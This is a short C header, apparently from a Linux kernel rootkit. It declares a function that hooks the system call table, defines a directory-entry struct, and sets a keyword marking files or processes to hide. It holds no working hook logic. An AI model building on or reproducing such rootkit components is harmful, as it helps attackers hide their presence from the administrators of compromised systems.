#ifndef HOOK_H
#define HOOK_H

#include <linux/perf_event.h>
#include <linux/dirent.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

#define TO_HIDE "lzrs_keyword"

int hook_syscall_table(void);

#endif
